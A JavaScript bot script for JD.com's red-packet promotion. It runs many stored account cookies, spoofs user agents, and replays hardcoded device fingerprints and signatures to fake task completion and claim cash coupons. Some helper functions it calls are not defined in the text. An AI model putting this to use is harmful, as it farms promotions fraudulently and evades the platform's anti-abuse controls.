/*
锦鲤红包任务
入口：[京东App领券频道]
20 2,19 * * * jd_lyhb.js
============Sami===============
1、由于签名限制,每次互助都要获取签名,如果担心风险,请禁用该脚本。
*/

const $ = new Env("锦鲤红包任务")
const Ver = '20220330';
const JD_API_HOST = 'https://api.m.jd.com/client.action';
const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
let cookiesArr = [], cookie = '';
let shareCodes = [];
let helpno = "";
!(async () => {
    await $.wait(1000);
    await VerCheck("lyhb",Ver);
    await $.wait(1000);
    requireConfig()
    
    for (let i = 0; i < cookiesArr.length; i++) {
        cookie = cookiesArr[i]
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.UserName1 =encodeURIComponent($.UserName)
        
        console.log(`\n账号【${$.index}】${$.UserName} 开始任务******`);
        //逛店铺
        await gdp();
        await $.wait(2000);
        //逛活动
        await ghd();
        await $.wait(2000);
        //逛频道
        await gpd();
        await $.wait(2000);
        //逛互动
        await ghd1();
        await $.wait(2000);
        //开始立得任务
        await ldrw();
        await $.wait(2000);
        //发现好券
        await fxhq();
    }
    await $.wait(5000);
})()  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

//逛店铺 type==2
async function gdp(){
    try{
        let flag=false;
        for(let i=0;i<4;i++){
            if(flag===true){break;}
            let data = await GetAllTask("taskHomePage");
            //data =JSON.stringify(data);
            //console.log(data);
            for (let vo of data.data.result.taskInfos ){
                //console.log(vo.taskType+'->'+vo.innerStatus);
    
                if(vo.taskType===2){
                    
                    if(vo.innerStatus ===7){
                        await getBodySign('startTask','2',$.UserName1);
                        console.log(helpno);
                        data1 = await GetTask("startTask");
                        //console.log(data1)
                        console.log("📮"+vo.panelSubtitle+"->"+data1.data.biz_msg+"✔✔✔")
                    }
                    if(vo.innerStatus ===2){
                       data1 = await GetTask1("getTaskDetailForColor","body=%7B%22taskType%22%3A%222%22%7D");
                       for (let vo1 of data1.data.result.advertDetails) {
                            //$.advertDetailsId= vo.id;
                            //$.advertDetailsname= vo.name;
                            //console.log(vo.id);
                            console.log("🎪开始逛店铺-》"+vo1.name);
                            data2=await GetTask1("taskReportForColor","body=%7B%22taskType%22%3A%222%22%2C%22detailId%22%3A%22"+vo1.id+"%22%7D");
                            //console.log(data2)
                            if(data2!=''){
                                console.log("🔊🔊🔊"+vo.panelSubtitle+"->"+data2.data.biz_msg )
                            }else{
                                console.log("IP已经被屏蔽，请三个小时后重试")
                            }
                            await $.wait(5000);
                        }
                    }
                    if(vo.innerStatus ===3){
                        await getBodySign('h5receiveRedpacketAll','2',$.UserName1);
                        data1 = await GetTask("h5receiveRedpacketAll");
                        //console.log(data1.data.biz_msg)
                        console.log("🧧"+vo.panelSubtitle+"->红包开出"+data1.data.result.discount+"元.")
                        await $.wait(5000); 
                    }
                    if(vo.innerStatus ===4){
                        console.log("🥇"+vo.panelSubtitle+"->任务已经完成啦✔✔✔")
                        flag=true
                    }    
                }
            }
        }
    }catch(e){
        
    }
}

//逛店铺 type==4
async function ghd(){
    try{
        let flag=false;
        for(let i=0;i<4;i++){
            if(flag===true){break;}
            let data = await GetAllTask("taskHomePage");
                for (let vo of data.data.result.taskInfos ){
                    //console.log(vo.taskType+'->'+vo.innerStatus);
                    if(vo.taskType===4){
                        
                        if(vo.innerStatus ===7){
                            await getBodySign('startTask','4',$.UserName1);
                            //console.log(helpno);
                            data1 = await GetTask("startTask");
                            //console.log(data1)
                            console.log("📮"+vo.panelSubtitle+"->"+data1.data.biz_msg+"✔✔✔")
                        }
                        if(vo.innerStatus ===2){
                           data1 = await GetTask1("getTaskDetailForColor","body=%7B%22taskType%22%3A%224%22%7D");
                           for (let vo1 of data1.data.result.advertDetails) {
                                //$.advertDetailsId= vo.id;
                                //$.advertDetailsname= vo.name;
                                //console.log(vo.id);
                                console.log("🎪开始逛活动-》"+vo1.name);
                                data2=await GetTask1("taskReportForColor","body=%7B%22taskType%22%3A%224%22%2C%22detailId%22%3A%22"+vo1.id+"%22%7D");
                                //console.log(data2)
                                if(data2!=''){
                                    console.log("🔊🔊🔊"+vo.panelSubtitle+"->"+data2.data.biz_msg )
                                }else{
                                    console.log("IP已经被屏蔽，请三个小时后重试")
                                }
                                await $.wait(5000);
                            }
                        }
                        if(vo.innerStatus ===3){
                            await getBodySign('h5receiveRedpacketAll','4',$.UserName1);
                            data1 = await GetTask("h5receiveRedpacketAll");
                            //console.log(data1.data.biz_msg)
                            console.log("🧧"+vo.panelSubtitle+"->红包开出"+data1.data.result.discount+"元.")
                            await $.wait(5000); 
                        }
                        if(vo.innerStatus ===4){
                            console.log("🥇"+vo.panelSubtitle+"->任务已经完成啦✔✔✔")
                            flag=true
                        }    
                    }
                    
                }
        }
    }catch(e){
        
    }
    
}

//逛频道 type==5
async function gpd(){
    try{
        let flag=false;
        for(let i=0;i<4;i++){
            if(flag===true){break;}
            let data = await GetAllTask("taskHomePage");
                for (let vo of data.data.result.taskInfos ){
                    //console.log(vo.taskType+'->'+vo.innerStatus);
                    if(vo.taskType===5){
                        
                        if(vo.innerStatus ===7){
                            await getBodySign('startTask','5',$.UserName1);
                            //console.log(helpno);
                            data1 = await GetTask("startTask");
                            //console.log(data1)
                            console.log("📮"+vo.panelSubtitle+"->"+data1.data.biz_msg+"✔✔✔")
                        }
                        if(vo.innerStatus ===2){
                           data1 = await GetTask1("getTaskDetailForColor","body=%7B%22taskType%22%3A%225%22%7D");
                           for (let vo1 of data1.data.result.advertDetails) {
                                //$.advertDetailsId= vo.id;
                                //$.advertDetailsname= vo.name;
                                //console.log(vo.id);
                                console.log("🎪开始逛频道-》"+vo1.name);
                                data2=await GetTask1("taskReportForColor","body=%7B%22taskType%22%3A%225%22%2C%22detailId%22%3A%22"+vo1.id+"%22%7D");
                                //console.log(data2)
                                if(data2!=''){
                                    console.log("🔊🔊🔊"+vo.panelSubtitle+"->"+data2.data.biz_msg )
                                }else{
                                    console.log("IP已经被屏蔽，请三个小时后重试")
                                }
                                await $.wait(5000);
                            }
                        }
                        if(vo.innerStatus ===3){
                            await getBodySign('h5receiveRedpacketAll','5',$.UserName1);
                            data1 = await GetTask("h5receiveRedpacketAll");
                            //console.log(data1.data.biz_msg)
                            console.log("🧧"+vo.panelSubtitle+"->红包开出"+data1.data.result.discount+"元.")
                            await $.wait(5000); 
                        }
                        if(vo.innerStatus ===4){
                            console.log("🥇"+vo.panelSubtitle+"->任务已经完成啦✔✔✔")
                            flag=true
                        }    
                    }
                    
                }
        }
    }catch(e){
        
    }
    
}

//逛互动 type==8
async function ghd1(){
    try{
        let flag=false;
        for(let i=0;i<4;i++){
            if(flag===true){break;}
            let data = await GetAllTask("taskHomePage");
                for (let vo of data.data.result.taskInfos ){
                    //console.log(vo.taskType+'->'+vo.innerStatus);
                    if(vo.taskType===8){
                        
                        if(vo.innerStatus ===7){
                            await getBodySign('startTask','8',$.UserName1);
                            //console.log(helpno);
                            data1 = await GetTask("startTask");
                            //console.log(data1)
                            console.log("📮"+vo.panelSubtitle+"->"+data1.data.biz_msg+"✔✔✔")
                        }
                        if(vo.innerStatus ===2){
                           data1 = await GetTask1("getTaskDetailForColor","body=%7B%22taskType%22%3A%228%22%7D");
                           for (let vo1 of data1.data.result.advertDetails) {
                                //$.advertDetailsId= vo.id;
                                //$.advertDetailsname= vo.name;
                                //console.log(vo.id);
                                console.log("🎪开始逛互动-》"+vo1.name);
                                data2=await GetTask1("taskReportForColor","body=%7B%22taskType%22%3A%228%22%2C%22detailId%22%3A%22"+vo1.id+"%22%7D");
                                //console.log(data2)
                                if(data2!=''){
                                    console.log("🔊🔊🔊"+vo.panelSubtitle+"->"+data2.data.biz_msg )
                                }else{
                                    console.log("IP已经被屏蔽，请三个小时后重试")
                                }
                                await $.wait(5000);
                            }
                        }
                        if(vo.innerStatus ===3){
                            await getBodySign('h5receiveRedpacketAll','8',$.UserName1);
                            data1 = await GetTask("h5receiveRedpacketAll");
                            //console.log(data1.data.biz_msg)
                            console.log("🧧"+vo.panelSubtitle+"->红包开出"+data1.data.result.discount+"元.")
                            await $.wait(5000); 
                        }
                        if(vo.innerStatus ===4){
                            console.log("🥇"+vo.panelSubtitle+"->任务已经完成啦✔✔✔")
                            flag=true
                        }    
                    }
                    
                }
        }
    }catch(e){
        
    }
    
}

//立得任务 type==1
async function ldrw(){
    try{
        let flag=false;
        for(let i=0;i<4;i++){
            if(flag===true){break;}
            let data = await GetAllTask("taskHomePage");
                for (let vo of data.data.result.taskInfos ){
                    //console.log(vo.taskType+'->'+vo.innerStatus);
                    if(vo.taskType===1){
                        
                        if(vo.innerStatus ===7){
                            await getBodySign('startTask','1',$.UserName1);
                            //console.log(helpno);
                            data1 = await GetTask("startTask");
                            //console.log(data1)
                            console.log("📮"+vo.panelSubtitle+"->"+data1.data.biz_msg+"✔✔✔")
                        }
                        if(vo.innerStatus ===2){
                           data1 = await GetTask2("https://api.m.jd.com/client.action?functionId=getCcTaskList&clientVersion=10.3.5&build=92468&client=android&partner=oppo&oaid=0DD656F325A74398A1CB3B4372BF1AD576fe38f2bc10980a86dd0681c82e8d89&eid=eidA258381236csdd/N8n/lORYGRZJxEpCvsB3fzfh68tomYApSHfsOuryc+PAzdt2geHVFR/9yAZvIkptxjAS+GyqXcWtQZeiqiCEfgD8e37Cii+0pz&sdkVersion=29&lang=zh_CN&harmonyOs=0&networkType=wifi&uts=0f31TVRjBSsqndu4%2FjgUPz6uymy50MQJsPnVYXZCH8DkVn5LjaFOTjosKDhNnQZbKHAF1Mla9HhEX8D3JoYPcKji52aoqZXYnLbEYhNI4fStkEqbAM9NwH6n9gH5li3r5ndIAds7Cgw8MrSMDFrADzTpEbp43f01AjY6vygNN509Nucit9lij9L9UiOOFHnSCqz2rxttkRjX2NYI7qKZQg%3D%3D&uemps=0-0&ext=%7B%22prstate%22%3A%220%22%2C%22pvcStu%22%3A%221%22%7D&ef=1&ep=%7B%22hdid%22%3A%22JM9F1ywUPwflvMIpYPok0tt5k9kW4ArJEU3lfLhxBqw%3D%22%2C%22ts%22%3A1644110687508%2C%22ridx%22%3A-1%2C%22cipher%22%3A%7B%22area%22%3A%22CV83Cv8yDzu5XzK%3D%22%2C%22d_model%22%3A%22UOTPJJKm%22%2C%22wifiBssid%22%3A%22dW5hbw93bq%3D%3D%22%2C%22osVersion%22%3A%22CJK%3D%22%2C%22d_brand%22%3A%22J1LGJm%3D%3D%22%2C%22screen%22%3A%22CtOzCsenCNqm%22%2C%22uuid%22%3A%22CQHrYJUyDtG2CWY4DJHrZG%3D%3D%22%2C%22aid%22%3A%22CQHrYJUyDtG2CWY4DJHrZG%3D%3D%22%2C%22openudid%22%3A%22CQHrYJUyDtG2CWY4DJHrZG%3D%3D%22%7D%2C%22ciphertype%22%3A5%2C%22version%22%3A%221.2.0%22%2C%22appname%22%3A%22com.jingdong.app.mall%22%7D&st=1644111824242&sign=5030d7a7e7c386da9e80f76c8a7a7e9f&sv=100","body=%7B%7D&");
                           console.log("🎪开始立得任务-》"+vo.panelSubtitle+' 浏览30S');
                           await $.wait(30000)
                           data1 = await GetTask2("https://api.m.jd.com/client.action?functionId=reportCcTask&clientVersion=10.3.5&build=92468&client=android&partner=oppo&oaid=0DD656F325A74398A1CB3B4372BF1AD576fe38f2bc10980a86dd0681c82e8d89&eid=eidA258381236csdd/N8n/lORYGRZJxEpCvsB3fzfh68tomYApSHfsOuryc+PAzdt2geHVFR/9yAZvIkptxjAS+GyqXcWtQZeiqiCEfgD8e37Cii+0pz&sdkVersion=29&lang=zh_CN&harmonyOs=0&networkType=wifi&uts=0f31TVRjBSsqndu4%2FjgUPz6uymy50MQJsPnVYXZCH8DkVn5LjaFOTjosKDhNnQZbKHAF1Mla9HhEX8D3JoYPcKji52aoqZXYnLbEYhNI4fStkEqbAM9NwH6n9gH5li3r5ndIAds7Cgw8MrSMDFrADzTpEbp43f01AjY6vygNN509Nucit9lij9L9UiOOFHnSCqz2rxttkRjX2NYI7qKZQg%3D%3D&uemps=0-0&ext=%7B%22prstate%22%3A%220%22%2C%22pvcStu%22%3A%221%22%7D&ef=1&ep=%7B%22hdid%22%3A%22JM9F1ywUPwflvMIpYPok0tt5k9kW4ArJEU3lfLhxBqw%3D%22%2C%22ts%22%3A1644110687508%2C%22ridx%22%3A-1%2C%22cipher%22%3A%7B%22area%22%3A%22CV83Cv8yDzu5XzK%3D%22%2C%22d_model%22%3A%22UOTPJJKm%22%2C%22wifiBssid%22%3A%22dW5hbw93bq%3D%3D%22%2C%22osVersion%22%3A%22CJK%3D%22%2C%22d_brand%22%3A%22J1LGJm%3D%3D%22%2C%22screen%22%3A%22CtOzCsenCNqm%22%2C%22uuid%22%3A%22CQHrYJUyDtG2CWY4DJHrZG%3D%3D%22%2C%22aid%22%3A%22CQHrYJUyDtG2CWY4DJHrZG%3D%3D%22%2C%22openudid%22%3A%22CQHrYJUyDtG2CWY4DJHrZG%3D%3D%22%7D%2C%22ciphertype%22%3A5%2C%22version%22%3A%221.2.0%22%2C%22appname%22%3A%22com.jingdong.app.mall%22%7D&st=1644111834457&sign=2e27486865bd006041235366a8ec112e&sv=121","body=%7B%22monitorRefer%22%3A%22%22%2C%22monitorSource%22%3A%22ccgroup_android_index_task%22%2C%22taskId%22%3A%221060%22%2C%22taskType%22%3A%221%22%7D&");
                          /* if(data1!=''){
                                    console.log("🔊🔊🔊"+vo.panelSubtitle+"->"+data1.data.biz_msg )
                                }else{
                                    console.log("IP已经被屏蔽，请三个小时后重试")
                                }
                                await $.wait(5000);*/
                         
                        }
                        if(vo.innerStatus ===3){
                            await getBodySign('h5receiveRedpacketAll','1',$.UserName1);
                            data1 = await GetTask("h5receiveRedpacketAll");
                            //console.log(data1.data.biz_msg)
                            console.log("🧧"+vo.panelSubtitle+"->红包开出"+data1.data.result.discount+"元.")
                            await $.wait(5000); 
                        }
                        if(vo.innerStatus ===4){
                            console.log("🥇"+vo.panelSubtitle+"->任务已经完成啦✔✔✔")
                            flag=true
                        }    
                    }
                    
                }
        }
    }catch(e){
        
    }
    
}

//发现好券 type==0
async function fxhq(){
    try{
        let flag=false;
        for(let i=0;i<4;i++){
            if(flag===true){break;}
            let data = await GetAllTask("taskHomePage");
                for (let vo of data.data.result.taskInfos ){
                    //console.log(vo.taskType+'->'+vo.innerStatus);
                    if(vo.taskType===0){
                     
                        if(vo.innerStatus ===7){
                            await getBodySign('startTask','0',$.UserName1);
                            //console.log(helpno);
                            data1 = await GetTask("startTask");
                            //console.log(data1)
                            console.log("📮"+vo.panelSubtitle+"->"+data1.data.biz_msg+"✔✔✔")
                        }
                        if(vo.innerStatus ===3){
                            await getBodySign('h5receiveRedpacketAll','0',$.UserName1);
                            data1 = await GetTask("h5receiveRedpacketAll");
                            //console.log(data1.data.biz_msg)
                            console.log("🧧"+vo.panelSubtitle+"->红包开出"+data1.data.result.discount+"元.")
                            await $.wait(5000); 
                        }
                        if(vo.innerStatus ===4){
                            console.log("🥇"+vo.panelSubtitle+"->任务已经完成啦✔✔✔")
                            flag=true
                        }    
                    }
                    
                }
        }
    }catch(e){
        
    }
    
}

function GetAllTask(functionId) {
    return new Promise(async resolve => {
        const options = {
            url: `https://api.m.jd.com/api?appid=jinlihongbao&functionId=${functionId}&loginType=2&client=jinlihongbao&t=${Date.now()}&clientVersion=10.3.5&osVersion=-1`,
            body: ``,
            headers: {
                "authority": "api.m.jd.com",
                "origin": "https://happy.m.jd.com",
                "accept": "application/json, text/plain, */*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": cookie,
                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
            }
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${JSON.stringify(err)}`);
                    console.log(`${$.name} API请求失败，请检查网路重试`);
                } else {
                    if (data) {
                        data = JSON.parse(data);
                    } else {
                        console.log(`服务器返回空数据`)
                    }
                }
            } catch (e) {
                $.logErr(e)
            } finally {
                resolve(data);
            }
        })
    })
}


function GetTask1(functionId,body) {
    return new Promise(resolve => {
        $.post({
            url: `https://api.m.jd.com/api?appid=jinlihongbao&functionId=${functionId}&loginType=2&client=jinlihongbao&t=${gettimestamp()}&clientVersion=10.3.5&osVersion=-1`,
               
            headers: {
                "Cookie": cookie,
                "Host":"api.m.jd.com",
                "origin": "https://happy.m.jd.com",
                "referer": "https://happy.m.jd.com/babelDiy/zjyw/3ugedFa7yA6NhxLN5gw2L3PF9sQC/index.html?channel=13&collectionId=545",
                'Content-Type': 'application/x-www-form-urlencoded',
                "X-Requested-With": "com.jingdong.app.mall",
                "User-Agent": "jdapp;iPhone;10.3.2;;;M/5.0;appBuild/167922;jdSupportDarkMode/0;ef/1;ep/%7B%22ciphertype%22%3A5%2C%22cipher%22%3A%7B%22ud%22%3A%22YtDrEWHvCQHrZJLsC2VtEQYmYtC5YtTtCJDtDJU3CzqmZJHtZtvsDG%3D%3D%22%2C%22sv%22%3A%22CJCkDq%3D%3D%22%2C%22iad%22%3A%22HUUnEJU1CJGjEJu2EM00DNLNBUO0CJujCUTNEJGnG0POCtO4%22%7D%2C%22ts%22%3A1648614071%2C%22hdid%22%3A%22JM9F1ywUPwflvMIpYPok0tt5k9kW4ArJEU3lfLhxBqw%3D%22%2C%22version%22%3A%221.0.3%22%2C%22appname%22%3A%22com.360buy.jdmobile%22%2C%22ridx%22%3A-1%7D;Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1;",
            },
            body: body,
        }, (_, resp, data) => {
            try {
                if(data){
                    data = JSON.parse(data)
                }
                
            } catch (e) {
                $.logErr('Error: ', e, resp)
            } finally {
                resolve(data)
            }
        })
    })
}
function GetTask2(url,body) {
    return new Promise(resolve => {
        $.post({
            url: url,               
            headers: {
                "Cookie": cookie,
                "Host":"api.m.jd.com",
                "origin": "https://happy.m.jd.com",
                "referer": "https://happy.m.jd.com/babelDiy/zjyw/3ugedFa7yA6NhxLN5gw2L3PF9sQC/index.html?channel=13&collectionId=545",
                'Content-Type': 'application/x-www-form-urlencoded',
                "X-Requested-With": "com.jingdong.app.mall",
                "User-Agent": "jdapp;iPhone;10.3.2;;;M/5.0;appBuild/167922;jdSupportDarkMode/0;ef/1;ep/%7B%22ciphertype%22%3A5%2C%22cipher%22%3A%7B%22ud%22%3A%22YtDrEWHvCQHrZJLsC2VtEQYmYtC5YtTtCJDtDJU3CzqmZJHtZtvsDG%3D%3D%22%2C%22sv%22%3A%22CJCkDq%3D%3D%22%2C%22iad%22%3A%22HUUnEJU1CJGjEJu2EM00DNLNBUO0CJujCUTNEJGnG0POCtO4%22%7D%2C%22ts%22%3A1648614071%2C%22hdid%22%3A%22JM9F1ywUPwflvMIpYPok0tt5k9kW4ArJEU3lfLhxBqw%3D%22%2C%22version%22%3A%221.0.3%22%2C%22appname%22%3A%22com.360buy.jdmobile%22%2C%22ridx%22%3A-1%7D;Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1;",
            },
            body: body,
        }, (_, resp, data) => {
            try {
                if(data){
                    data = JSON.parse(data)
                }
                
            } catch (e) {
                $.logErr('Error: ', e, resp)
            } finally {
                resolve(data)
            }
        })
    })
}






function requireConfig() {
    return new Promise(resolve => {
        notify = $.isNode() ? require('./sendNotify') : '';
        const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
        if ($.isNode()) {
            Object.keys(jdCookieNode).forEach((item) => {
                if (jdCookieNode[item]) {
                    cookiesArr.push(jdCookieNode[item])
                }
            })
            if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
        } else {
            cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
        }
        console.log(`共${cookiesArr.length}个京东账号\n`)
        //resolve()
    })
}
function gettimestamp() {
  let time = new Date().getTime();
  return `${time}`;
}




function random(min, max) {
  let num = Math.floor(Math.random() * (max - min)) + min;
  return `${num}`;
}


function randomString(e) {
    e = e || 32;
    let t = "abcdefhijkmnprstwxyz2345678",
        a = t.length,
        n = "";
    for (i = 0; i < e; i++)
        n += t.charAt(Math.floor(Math.random() * a));
    return n
}


function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
